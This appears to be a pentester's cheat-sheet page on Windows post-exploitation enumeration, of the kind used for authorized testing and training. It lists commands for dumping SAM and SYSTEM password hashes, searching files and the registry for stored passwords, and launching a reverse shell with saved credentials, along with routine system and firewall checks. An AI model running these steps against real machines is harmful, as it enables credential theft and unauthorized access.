---
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# 🔎 Windows Post Enumeration

<figure><img src="../../../.gitbook/assets/2024-02-15_21-47 (1).png" alt=""><figcaption></figcaption></figure>

If SYSTEM or SAM found in winPEAS use one of this:&#x20;

{% embed url="https://github.com/CiscoCXSecurity/creddump7/blob/master/pwdump.py" %}

{% hint style="info" %}
windows/system32/config/SAM(or SYSTEM) is where password hashes are located

If AD ntds.dit will have the database

To get the hash:

```bash
impacket-secretsdump -sam SAM -system SYSTEM local
```
{% endhint %}

```bash
python2 pwdump.py /tools /SYSTEM /tools/SAM
```

{% embed url="https://github.com/h4ms1k/samdump" %}

{% hint style="info" %}
If starts with 3186 it is an empty string
{% endhint %}

## Automatic

**Wesng**:

{% code overflow="wrap" %}
```bash
python3 wesng.py /tools/systeminfo.txt -i 'Elevation of Privilege' --exploit-only | more
```
{% endcode %}

## Manual:

Get stored passwords:

```
cmdkey /list
```

```
runas /savecred /user:admin C:\Path\to\reverse.exe
```

```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml 
findstr /SIM /C:"GitLab" *.txt  #Replace GitLab with any keyword
```

System info (cmd):&#x20;

{% code title="Chimichurri for Windows 2008 R1 & R2, Windows Vista and Windows 7" %}
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
{% endcode %}

Check files with pass in name or .config in current directory recursively:

{% code title="Run  in temp or suspicious program directory" %}
```
dir /s *pass* == *.config
```
{% endcode %}

List all scheduled tasks:

```
schtasks /query /fo LIST /v
```

To check all processes running:

```powershell
get-process
```

Check password in registry:

```
reg query HKLM /f password /t REG_SZ /s
```

```
reg query HKCU /f password /t REG_SZ /s
```

Get patches:&#x20;

```
wmic qfe
```

&#x20;To get disks:&#x20;

```
wmic logicaldisk
```

To check privileges:&#x20;

```
whoami /priv
```

&#x20;To check groups involved in:&#x20;

```
whoami /groups
```

To check users:

```
net user
```

Can also check specific user with:&#x20;

```
net user administrator
```

We can check group details from above command with:

```
net localgroup
```

&#x20;To look at arp table:&#x20;

```
arp -a 
```

Print route:&#x20;

```
route print 
```

For active connections:&#x20;

```
netstat -ano
```

Search password (In the directory)

```
findstr /si password *.txt *.ini *.config
```

### Check Firewall and AV

To check windows defender

```
sc query windefend
```

Check all processes

```
sc queryex type= service
```

#### Check firewall :

```
netsh advfirewall firewall dump
```

```
netsh firewall show state
```

```
netsh firewall show config
```
